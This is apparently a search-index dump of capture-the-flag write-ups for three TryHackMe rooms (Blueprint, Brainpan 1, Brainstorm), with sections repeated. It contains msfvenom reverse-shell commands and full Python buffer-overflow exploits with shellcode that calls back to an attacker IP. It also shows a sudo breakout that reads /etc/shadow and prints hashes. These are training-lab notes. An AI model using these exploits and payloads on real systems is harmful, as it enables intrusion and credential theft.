pcoip-mgmt no-response 7974/tcp filtered unknown no-response 8080/tcp open http syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Index of / | http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE |_ Potentially risky methods: TRACE 21620/tcp filtered unknown no-response 32396/tcp filtered unknown no-response 38683/tcp filtered unknown no-response 46207/tcp filtered unknown no-response 49152/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49158/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49159/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49160/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 52621/tcp filtered unknown no-response Aggressive OS guesses: Microsoft Server 2008 R2 SP1 (96%), Microsoft Windows 7 or 8.1 R1 (93%) Enumeration \u00b6 I went against what I normally do and headed for the webserver first. It's running some CMS I haven't heard of before osCommerce Online Merchang v2.3.4 . The version is leaked in the webapp's URL. I was able to find a few exploits for this using searchsploit, I chose to test the most recent RCE exploit 50128.py Exploitation \u00b6 This exploit was failing out of the box because the webserver is using a self-signed cert...I just added verify=False to the parameter list of each request.*() call to bypass this. The exploit gives me an incomplete root RCE shell. I quickly jumped over to a reverse tcp shell which I generated using msfvenom. msfvenom -p windows/shell_reverse_tcp LHOST=<myIP> LPORT=4444 -f exe -o shell.exe Then I used certutil to download the reverse shell and executed it. I now have a much more stable shell as nt authority\\system . I was able to read the root.txt file and install and run mimikatz to dump the NTLM hashes for cracking. Trying to crack with hashcat hashcat -m 1000 -a 3 hash.txt As I sit here reviewing scans of other boxes and listening to my computer, obviously pissed about the heavy load hashcat is putting on it....I remember using something to just lookup the hashes online in the past. A quick google brought me back to CrackStation . I was able to paste the hash and quickly look it up.","title":"Blueprint"},{"location":"TryHackMe/Blueprint/#blueprint","text":"This one is a windows box with minimal hints.","title":"Blueprint"},{"location":"TryHackMe/Blueprint/#port-scan","text":"PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: 404 - File or directory not found. |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 443/tcp open ssl/http syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) | http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE |_ Potentially risky methods: TRACE |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | ssl-cert: Subject: commonName=localhost | Issuer: commonName=localhost | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2009-11-10T23:48:47 | Not valid after: 2019-11-08T23:48:47 | MD5: a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0 | SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6 445/tcp open microsoft-ds syn-ack ttl 125 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql syn-ack ttl 125 MariaDB (unauthorized) 5172/tcp filtered pcoip-mgmt no-response 7974/tcp filtered unknown no-response 8080/tcp open http syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Index of / | http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE |_ Potentially risky methods: TRACE 21620/tcp filtered unknown no-response 32396/tcp filtered unknown no-response 38683/tcp filtered unknown no-response 46207/tcp filtered unknown no-response 49152/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49158/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49159/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49160/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 52621/tcp filtered unknown no-response Aggressive OS guesses: Microsoft Server 2008 R2 SP1 (96%), Microsoft Windows 7 or 8.1 R1 (93%)","title":"Port scan"},{"location":"TryHackMe/Blueprint/#enumeration","text":"I went against what I normally do and headed for the webserver first. It's running some CMS I haven't heard of before osCommerce Online Merchang v2.3.4 . The version is leaked in the webapp's URL. I was able to find a few exploits for this using searchsploit, I chose to test the most recent RCE exploit 50128.py","title":"Enumeration"},{"location":"TryHackMe/Blueprint/#exploitation","text":"This exploit was failing out of the box because the webserver is using a self-signed cert...I just added verify=False to the parameter list of each request.*() call to bypass this. The exploit gives me an incomplete root RCE shell. I quickly jumped over to a reverse tcp shell which I generated using msfvenom. msfvenom -p windows/shell_reverse_tcp LHOST=<myIP> LPORT=4444 -f exe -o shell.exe Then I used certutil to download the reverse shell and executed it. I now have a much more stable shell as nt authority\\system . I was able to read the root.txt file and install and run mimikatz to dump the NTLM hashes for cracking. Trying to crack with hashcat hashcat -m 1000 -a 3 hash.txt As I sit here reviewing scans of other boxes and listening to my computer, obviously pissed about the heavy load hashcat is putting on it....I remember using something to just lookup the hashes online in the past. A quick google brought me back to CrackStation . I was able to paste the hash and quickly look it up.","title":"Exploitation"},{"location":"TryHackMe/Brainpan1/","text":"Brainpan 1 \u00b6 Recon \u00b6 The only thing I know about this challenge is there is a buffer overflow involved. Scanning \u00b6 PORT STATE SERVICE REASON VERSION 9999/tcp open abyss? syn-ack ttl 61 | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http syn-ack ttl 61 SimpleHTTPServer 0.6 (Python 2.7.3) |_http-title: Site doesn't have a title (text/html). |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 Enumeration \u00b6 Port 9999 is some console. I did a few password guesses but nothing stuck. Port 10000 is running a webserver which has a slightly outdated infographic about secure coding. Dirbuster found a /bin/ directory on the webserver. There's one executable file hosted there: brainpan.exe . This much be the service behind port 9999. I'll copy it away for exploit development in my lab. The box says to do the work in linux, but why? I already can do it repetedly in Windows. Maybe someday I'll learn the finer points of linux debuggers, but for now I'll do it the way I already know how. Exploit development. \u00b6 I got the service running in my lab and verified the port with nmap. The output for port 9999 matched the initial scan exactly! The buffer overflow script I wrote only identified \\x00 as a badchar. Additionally the exploit is failing. The exploit was failing because of a bug in the script. Working now. I swapped out some variables and made the exploit ready for brainpan. Here is the final result: #!/usr/bin/env python3 import socket ip = \"10.10.109.180\" port = 9999 prefix = \" \" offset = 523 overflow = \"A\" * offset retn = \"\\xf3\\x12\\x17\\x31\" padding = \"\\x90\" * 16 # msfvenom -p windows/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 EXITFUNC=thread -b \"\\x00\" -f c payload = \"\\xda\\xc4\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1\\x52\\xbb\\xad\\xfc\\xa8\\x8e\\x31\\x58\\x17\\x83\\xe8\\xfc\\x03\\xf5\\xef\\x4a\\x7b\\xf9\\xf8\\x09\\x84\\x01\\xf9\\x6d\\x0c\\xe4\\xc8\\xad\\x6a\\x6d\\x7a\\x1e\\xf8\\x23\\x77\\xd5\\xac\\xd7\\x0c\\x9b\\x78\\xd8\\xa5\\x16\\x5f\\xd7\\x36\\x0a\\xa3\\x76\\xb5\\x51\\xf0\\x58\\x84\\x99\\x05\\x99\\xc1\\xc4\\xe4\\xcb\\x9a\\x83\\x5b\\xfb\\xaf\\xde\\x67\\x70\\xe3\\xcf\\xef\\x65\\xb4\\xee\\xde\\x38\\xce\\xa8\\xc0\\xbb\\x03\\xc1\\x48\\xa3\\x40\\xec\\x03\\x58\\xb2\\x9a\\x95\\x88\\x8a\\x63\\x39\\xf5\\x22\\x96\\x43\\x32\\x84\\x49\\x36\\x4a\\xf6\\xf4\\x41\\x89\\x84\\x22\\xc7\\x09\\x2e\\xa0\\x7f\\xf5\\xce\\x65\\x19\\x7e\\xdc\\xc2\\x6d\\xd8\\xc1\\xd5\\xa2\\x53\\xfd\\x5e\\x45\\xb3\\x77\\x24\\x62\\x17\\xd3\\xfe\\x0b\\x0e\\xb9\\x51\\x33\\x50\\x62\\x0d\\x91\\x1b\\x8f\\x5a\\xa8\\x46\\xd8\\xaf\\x81\\x78\\x18\\xb8\\x92\\x0b\\x2a\\x67\\x09\\x83\\x06\\xe0\\x97\\x54\\x68\\xdb\\x60\\xca\\x97\\xe4\\x90\\xc3\\x53\\xb0\\xc0\\x7b\\x75\\xb9\\x8a\\x7b\\x7a\\x6c\\x1c\\x2b\\xd4\\xdf\\xdd\\x9b\\x94\\x8f\\xb5\\xf1\\x1a\\xef\\xa6\\xfa\\xf0\\x98\\x4d\\x01\\x93\\xac\\x93\\x40\\xba\\xd9\\x91\\x52\\x2d\\x46\\x1f\\xb4\\x27\\x66\\x49\\x6f\\xd0\\x1f\\xd0\\xfb\\x41\\xdf\\xce\\x86\\x42\\x6b\\xfd\\x77\\x0c\\x9c\\x88\\x6b\\xf9\\x6c\\xc7\\xd1\\xac\\x73\\xfd\\x7d\\x32\\xe1\\x9a\\x7d\\x3d\\x1a\\x35\\x2a\\x6a\\xec\\x4c\\xbe\\x86\\x57\\xe7\\xdc\\x5a\\x01\\xc0\\x64\\x81\\xf2\\xcf\\x65\\x44\\x4e\\xf4\\x75\\x90\\x4f\\xb0\\x21\\x4c\\x06\\x6e\\x9f\\x2a\\xf0\\xc0\\x49\\xe5\\xaf\\x8a\\x1d\\x70\\x9c\\x0c\\x5b\\x7d\\xc9\\xfa\\x83\\xcc\\xa4\\xba\\xbc\\xe1\\x20\\x4b\\xc5\\x1f\\xd1\\xb4\\x1c\\xa4\\xf1\\x56\\xb4\\xd1\\x99\\xce\\x5d\\x58\\xc4\\xf0\\x88\\x9f\\xf1\\x72\\x38\\x60\\x06\\x6a\\x49\\x65\\x42\\x2c\\xa2\\x17\\xdb\\xd9\\xc4\\x84\\xdc\\xcb;\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") I get a shell. But not a very good one. I was able to get a somewhat normal shell by executing /bin/bash and the python pty.spawn trick. python3 -c \"import pty; pty.spawn('/bin/bash');\" The shell was still pretty unstable and unpredictable, so I ran linpeas and downloaded the output for review. LinPEAS findings \u00b6 OS: Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 Sudo 1.8.5p2 PROCESSOR_ARCHITECTURE=x86 [1] dirty_cow CVE-2016-5195 Source: http://www.exploit-db.com/exploits/40616 [2] exploit_x CVE-2018-14665 Source: http://www.exploit-db.com/exploits/45697 [3] msr CVE-2013-0268 Source: http://www.exploit-db.com/exploits/27297 [4] perf_swevent CVE-2013-2094 Source: http://www.exploit-db.com/exploits/26131 [5] pp_key CVE-2016-0728 Source: http://www.exploit-db.com/exploits/39277 [6] timeoutpwn CVE-2014-0038 Source: http://www.exploit-db.com/exploits/31346 The output is messy, but it appears cron is running and the standard crontab file has an entry that starts chksrv.sh (the script that starts brainpan.exe). m h dom mon dow command \u00b6 /home/puck/checksrv.sh User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 .sh files in path \u255a https://book.hacktricks.xyz/linux-unix/privilege-esca lation#script-binaries-in-path /usr/bin/gettext.sh I was investigating the crontab file to see if I could gain execution somehow. I don't have write access to crontab, or the script it calls...but wait. The brainpan executable was in my users's home directory. Maybe have write permissions to it. I started playing with anansi_util since I was able to run it as sudo. Using GTFO bins I was able to find a few different breakout methods for the manual command. I was able to read /etc/shadow Z:\\home\\puck>sudo /home/anansi/bin/anansi_util manual /etc/shadowi root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdO\u2010hg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZa\u2010Dioh0:15768:0:99999:7::: reynard:$6$h54J.qxd$yL5md3J4dON\u2010wNl.36iA.mkcabQqRMmeZ0VFKxIVpX\u2010eNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7::: anansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xv\u2010Ja3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1ly\u2010DGIPE1:15768:0:99999:7::: puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEm\u2010bIcBF9Oi7q2eAi0TMMqO\u2010hg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::","title":"Brainpan 1"},{"location":"TryHackMe/Brainpan1/#brainpan-1","text":"","title":"Brainpan 1"},{"location":"TryHackMe/Brainpan1/#recon","text":"The only thing I know about this challenge is there is a buffer overflow involved.","title":"Recon"},{"location":"TryHackMe/Brainpan1/#scanning","text":"PORT STATE SERVICE REASON VERSION 9999/tcp open abyss? syn-ack ttl 61 | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http syn-ack ttl 61 SimpleHTTPServer 0.6 (Python 2.7.3) |_http-title: Site doesn't have a title (text/html). |_http-server-header: SimpleHTTP/0.6 Python/2.7.3","title":"Scanning"},{"location":"TryHackMe/Brainpan1/#enumeration","text":"Port 9999 is some console. I did a few password guesses but nothing stuck. Port 10000 is running a webserver which has a slightly outdated infographic about secure coding. Dirbuster found a /bin/ directory on the webserver. There's one executable file hosted there: brainpan.exe . This much be the service behind port 9999. I'll copy it away for exploit development in my lab. The box says to do the work in linux, but why? I already can do it repetedly in Windows. Maybe someday I'll learn the finer points of linux debuggers, but for now I'll do it the way I already know how.","title":"Enumeration"},{"location":"TryHackMe/Brainpan1/#exploit-development","text":"I got the service running in my lab and verified the port with nmap. The output for port 9999 matched the initial scan exactly! The buffer overflow script I wrote only identified \\x00 as a badchar. Additionally the exploit is failing. The exploit was failing because of a bug in the script. Working now. I swapped out some variables and made the exploit ready for brainpan. Here is the final result: #!/usr/bin/env python3 import socket ip = \"10.10.109.180\" port = 9999 prefix = \" \" offset = 523 overflow = \"A\" * offset retn = \"\\xf3\\x12\\x17\\x31\" padding = \"\\x90\" * 16 # msfvenom -p windows/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 EXITFUNC=thread -b \"\\x00\" -f c payload = \"\\xda\\xc4\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1\\x52\\xbb\\xad\\xfc\\xa8\\x8e\\x31\\x58\\x17\\x83\\xe8\\xfc\\x03\\xf5\\xef\\x4a\\x7b\\xf9\\xf8\\x09\\x84\\x01\\xf9\\x6d\\x0c\\xe4\\xc8\\xad\\x6a\\x6d\\x7a\\x1e\\xf8\\x23\\x77\\xd5\\xac\\xd7\\x0c\\x9b\\x78\\xd8\\xa5\\x16\\x5f\\xd7\\x36\\x0a\\xa3\\x76\\xb5\\x51\\xf0\\x58\\x84\\x99\\x05\\x99\\xc1\\xc4\\xe4\\xcb\\x9a\\x83\\x5b\\xfb\\xaf\\xde\\x67\\x70\\xe3\\xcf\\xef\\x65\\xb4\\xee\\xde\\x38\\xce\\xa8\\xc0\\xbb\\x03\\xc1\\x48\\xa3\\x40\\xec\\x03\\x58\\xb2\\x9a\\x95\\x88\\x8a\\x63\\x39\\xf5\\x22\\x96\\x43\\x32\\x84\\x49\\x36\\x4a\\xf6\\xf4\\x41\\x89\\x84\\x22\\xc7\\x09\\x2e\\xa0\\x7f\\xf5\\xce\\x65\\x19\\x7e\\xdc\\xc2\\x6d\\xd8\\xc1\\xd5\\xa2\\x53\\xfd\\x5e\\x45\\xb3\\x77\\x24\\x62\\x17\\xd3\\xfe\\x0b\\x0e\\xb9\\x51\\x33\\x50\\x62\\x0d\\x91\\x1b\\x8f\\x5a\\xa8\\x46\\xd8\\xaf\\x81\\x78\\x18\\xb8\\x92\\x0b\\x2a\\x67\\x09\\x83\\x06\\xe0\\x97\\x54\\x68\\xdb\\x60\\xca\\x97\\xe4\\x90\\xc3\\x53\\xb0\\xc0\\x7b\\x75\\xb9\\x8a\\x7b\\x7a\\x6c\\x1c\\x2b\\xd4\\xdf\\xdd\\x9b\\x94\\x8f\\xb5\\xf1\\x1a\\xef\\xa6\\xfa\\xf0\\x98\\x4d\\x01\\x93\\xac\\x93\\x40\\xba\\xd9\\x91\\x52\\x2d\\x46\\x1f\\xb4\\x27\\x66\\x49\\x6f\\xd0\\x1f\\xd0\\xfb\\x41\\xdf\\xce\\x86\\x42\\x6b\\xfd\\x77\\x0c\\x9c\\x88\\x6b\\xf9\\x6c\\xc7\\xd1\\xac\\x73\\xfd\\x7d\\x32\\xe1\\x9a\\x7d\\x3d\\x1a\\x35\\x2a\\x6a\\xec\\x4c\\xbe\\x86\\x57\\xe7\\xdc\\x5a\\x01\\xc0\\x64\\x81\\xf2\\xcf\\x65\\x44\\x4e\\xf4\\x75\\x90\\x4f\\xb0\\x21\\x4c\\x06\\x6e\\x9f\\x2a\\xf0\\xc0\\x49\\xe5\\xaf\\x8a\\x1d\\x70\\x9c\\x0c\\x5b\\x7d\\xc9\\xfa\\x83\\xcc\\xa4\\xba\\xbc\\xe1\\x20\\x4b\\xc5\\x1f\\xd1\\xb4\\x1c\\xa4\\xf1\\x56\\xb4\\xd1\\x99\\xce\\x5d\\x58\\xc4\\xf0\\x88\\x9f\\xf1\\x72\\x38\\x60\\x06\\x6a\\x49\\x65\\x42\\x2c\\xa2\\x17\\xdb\\xd9\\xc4\\x84\\xdc\\xcb;\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") I get a shell. But not a very good one. I was able to get a somewhat normal shell by executing /bin/bash and the python pty.spawn trick. python3 -c \"import pty; pty.spawn('/bin/bash');\" The shell was still pretty unstable and unpredictable, so I ran linpeas and downloaded the output for review.","title":"Exploit development."},{"location":"TryHackMe/Brainpan1/#linpeas-findings","text":"OS: Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 Sudo 1.8.5p2 PROCESSOR_ARCHITECTURE=x86 [1] dirty_cow CVE-2016-5195 Source: http://www.exploit-db.com/exploits/40616 [2] exploit_x CVE-2018-14665 Source: http://www.exploit-db.com/exploits/45697 [3] msr CVE-2013-0268 Source: http://www.exploit-db.com/exploits/27297 [4] perf_swevent CVE-2013-2094 Source: http://www.exploit-db.com/exploits/26131 [5] pp_key CVE-2016-0728 Source: http://www.exploit-db.com/exploits/39277 [6] timeoutpwn CVE-2014-0038 Source: http://www.exploit-db.com/exploits/31346 The output is messy, but it appears cron is running and the standard crontab file has an entry that starts chksrv.sh (the script that starts brainpan.exe).","title":"LinPEAS findings"},{"location":"TryHackMe/Brainpan1/#m-h-dom-mon-dow-command","text":"/home/puck/checksrv.sh User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 .sh files in path \u255a https://book.hacktricks.xyz/linux-unix/privilege-esca lation#script-binaries-in-path /usr/bin/gettext.sh I was investigating the crontab file to see if I could gain execution somehow. I don't have write access to crontab, or the script it calls...but wait. The brainpan executable was in my users's home directory. Maybe have write permissions to it. I started playing with anansi_util since I was able to run it as sudo. Using GTFO bins I was able to find a few different breakout methods for the manual command. I was able to read /etc/shadow Z:\\home\\puck>sudo /home/anansi/bin/anansi_util manual /etc/shadowi root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdO\u2010hg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZa\u2010Dioh0:15768:0:99999:7::: reynard:$6$h54J.qxd$yL5md3J4dON\u2010wNl.36iA.mkcabQqRMmeZ0VFKxIVpX\u2010eNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7::: anansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xv\u2010Ja3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1ly\u2010DGIPE1:15768:0:99999:7::: puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEm\u2010bIcBF9Oi7q2eAi0TMMqO\u2010hg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::","title":"m h  dom mon dow   command"},{"location":"TryHackMe/Brainstorm/","text":"Brainstorm \u00b6 Recon \u00b6 Scan \u00b6 This room is a bit challenging. The scan shows ftp (21) and some chat client (9999). I only see these two, but apparently there are 6. Must be some UDP ports I missed. Explore the services \u00b6 FTP \u00b6 Anonymous login is allowed. I logged in with user ftp and pass ftp but kept hitting an error about Extended Passive Mode. . I did some reasearch to refresh my memory on what this was. ftp 10.10.109.7 Connected to 10.10.109.7. 220 Microsoft FTP Service Name (10.10.109.7:nate): ftp 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls 229 Entering Extended Passive Mode (|||49356|) Long story short, you need to force active mode since passive mode is failing. I spent a lot of time googling this error and reading about how to fix it. But the answer was right in the damn man page; need to force active mode with the -A flag. ftp 10.10.109.7 -A Connected to 10.10.109.7. 220 Microsoft FTP Service Name (10.10.109.7:nate): ftp 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls 200 EPRT command successful. 150 Opening ASCII mode data connection. 08-29-19 07:36PM <DIR> chatserver 226 Transfer complete. Great, it's working now and I see a folder. ftp> cd chatserver 250 CWD command successful. ftp> ls 200 EPRT command successful. 150 Opening ASCII mode data connection. 08-29-19 09:26PM 43747 chatserver.exe 08-29-19 09:27PM 30761 essfunc.dll 226 Transfer complete. Find chatserver.exe and download it for later. ftp> get chatserver.exe local: chatserver.exe remote: chatserver.exe 200 EPRT command successful. 150 Opening ASCII mode data connection. 100% |******************************************************************| 43747 43.33 KiB/s 00:00 ETA 226 Transfer complete. WARNING! 45 bare linefeeds received in ASCII mode. File may not have transferred correctly. 43747 bytes received in 00:00 (43.31 KiB/s) Crap, I've ran into this before. Need to use binary to transfer executables. ftp> binary 200 Type set to I. ftp> get chatserver.exe local: chatserver.exe remote: chatserver.exe 200 EPRT command successful. 125 Data connection already open; Transfer starting. 100% |******************************************************************| 43747 43.87 KiB/s 00:00 ETA 226 Transfer complete. Exploit Development \u00b6 Setting up the Dev environment \u00b6 Setting up the sandbox \u00b6 Now I'll set up a Windows Dev environment in Windows Sandbox (I don't want to run this executable on my PC.) It appears to be working. Will not have to to do anything crafty with the network. Immunity and python \u00b6 Then install immunity, which also installs python. The python installer failed the first time around so I selected \"Install just for this user\" the second time around. Not sure if it was coincidence or lucky guess but it worked. Lets get crackin! Actually immunity wouldn't boot as it coulnd't find the python files. So I'm moving this project to a dev version of Windows 11 I have installed in the lab. It'll be a good first look at Windows 11 anyways. EDIT: Turns out it had nothing to do with the sandbox. It's possible this would have worked if I did all the below fixes, but everything is lost from a sandbox when the session is closed. It's probably better to use a VM anyways so I can maintain the debugging environment. I was able to get everything working in Windows 11. Had to configure Windows firewall to allow port 9999 though. Everything is working! Seems like the overflow will be in the username. Lets fire up the tool. Mona \u00b6 Looks like I spoke too soon about everything working. I got an error when trying to run a !mona command. pycommands: error importing module I see online this error is from using the 64-bit python and using a 32bit version should fix it. So...reinstall python with x86 version. Also, I need to install mona . Wow, setting up this environment is a PITA - it was nice having a box ready on TryHackMe for the other challenges. I'll have to save this setup. Another issue - since the file was downloaded from the internet, it has to be marked as safe in the file properties before it can be used. Another issue I ran into was the mona.py file was full of HTML as I downloaded it incorrectly. Found that here on github I never want to go through this again \u00b6 IT WORKS!!!! Getting a snapshot... Develop the exploit \u00b6 I used the buffer overflow helper script I made and got this box done MUCH quicker than I was able to get the DEV environment set up. I never turned off Windows AV module so I only had access for a bit before getting kicked. The completed POC exploit is as follows: #!/usr/bin/env python3 import socket ip = \"192.168.1.104\" port = 9999 prefix = \" \" offset = 6107 overflow = \"A\" * offset retn = \"\\xdf\\x14\\x50\\x62\" padding = \"\\x90\" * 16 payload = \"\\xbd\\xcf\\xbb\\xca\\x95\\xdb\\xc2\\xd9\\x74\\x24\\xf4\\x58\\x33\\xc9\\xb1\\x52\\x31\\x68\\x12\\x03\\x68\\x12\\x83\\x27\\x47\\x28\\x60\\x4b\\x50\\x2f\\x8b\\xb3\\xa1\\x50\\x05\\x56\\x90\\x50\\x71\\x13\\x83\\x60\\xf1\\x71\\x28\\x0a\\x57\\x61\\xbb\\x7e\\x70\\x86\\x0c\\x34\\xa6\\xa9\\x8d\\x65\\x9a\\xa8\\x0d\\x74\\xcf\\x0a\\x2f\\xb7\\x02\\x4b\\x68\\xaa\\xef\\x19\\x21\\xa0\\x42\\x8d\\x46\\xfc\\x5e\\x26\\x14\\x10\\xe7\\xdb\\xed\\x13\\xc6\\x4a\\x65\\x4a\\xc8\\x6d\\xaa\\xe6\\x41\\x75\\xaf\\xc3\\x18\\x0e\\x1b\\xbf\\x9a\\xc6\\x55\\x40\\x30\\x27\\x5a\\xb3\\x48\\x60\\x5d\\x2c\\x3f\\x98\\x9d\\xd1\\x38\\x5f\\xdf\\x0d\\xcc\\x7b\\x47\\xc5\\x76\\xa7\\x79\\x0a\\xe0\\x2c\\x75\\xe7\\x66\\x6a\\x9a\\xf6\\xab\\x01\\xa6\\x73\\x4a\\xc5\\x2e\\xc7\\x69\\xc1\\x6b\\x93\\x10\\x50\\xd6\\x72\\x2c\\x82\\xb9\\x2b\\x88\\xc9\\x54\\x3f\\xa1\\x90\\x30\\x8c\\x88\\x2a\\xc1\\x9a\\x9b\\x59\\xf3\\x05\\x30\\xf5\\xbf\\xce\\x9e\\x02\\xbf\\xe4\\x67\\x9c\\x3e\\x07\\x98\\xb5\\x84\\x53\\xc8\\xad\\x2d\\xdc\\x83\\x2d\\xd1\\x09\\x03\\x7d\\x7d\\xe2\\xe4\\x2d\\x3d\\x52\\x8d\\x27\\xb2\\x8d\\xad\\x48\\x18\\xa6\\x44\\xb3\\xcb\\x09\\x30\\xba\\x7b\\xe2\\x43\\xbc\\x6a\\xae\\xca\\x5a\\xe6\\x5e\\x9b\\xf5\\x9f\\xc7\\x86\\x8d\\x3e\\x07\\x1d\\xe8\\x01\\x83\\x92\\x0d\\xcf\\x64\\xde\\x1d\\xb8\\x84\\x95\\x7f\\x6f\\x9a\\x03\\x17\\xf3\\x09\\xc8\\xe7\\x7a\\x32\\x47\\xb0\\x2b\\x84\\x9e\\x54\\xc6\\xbf\\x08\\x4a\\x1b\\x59\\x72\\xce\\xc0\\x9a\\x7d\\xcf\\x85\\xa7\\x59\\xdf\\x53\\x27\\xe6\\x8b\\x0b\\x7e\\xb0\\x65\\xea\\x28\\x72\\xdf\\xa4\\x87\\xdc\\xb7\\x31\\xe4\\xde\\xc1\\x3d\\x21\\xa9\\x2d\\x8f\\x9c\\xec\\x52\\x20\\x49\\xf9\\x2b\\x5c\\xe9\\x06\\xe6\\xe4\\x09\\xe5\\x22\\x11\\xa2\\xb0\\xa7\\x98\\xaf\\x42\\x12\\xde\\xc9\\xc0\\x96\\x9f\\x2d\\xd8\\xd3\\x9a\\x6a\\x5e\\x08\\xd7\\xe3\\x0b\\x2e\\x44\\x03\\x1e;\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") Exploit the target \u00b6 Now to swap out the payload (line 15) and the RHOST IP (line 5). Time to test the exploit. Nice, I got a system shell!","title":"Brainstorm"},{"location":"TryHackMe/Brainstorm/#brainstorm","text":"","title":"Brainstorm"},{"location":"TryHackMe/Brainstorm/#recon","text":"","title":"Recon"},{"location":"TryHackMe/Brainstorm/#scan","text":"This room is a bit challenging. The scan shows ftp (21) and some chat client (9999). I only see these two, but apparently there are 6. Must be some UDP ports I 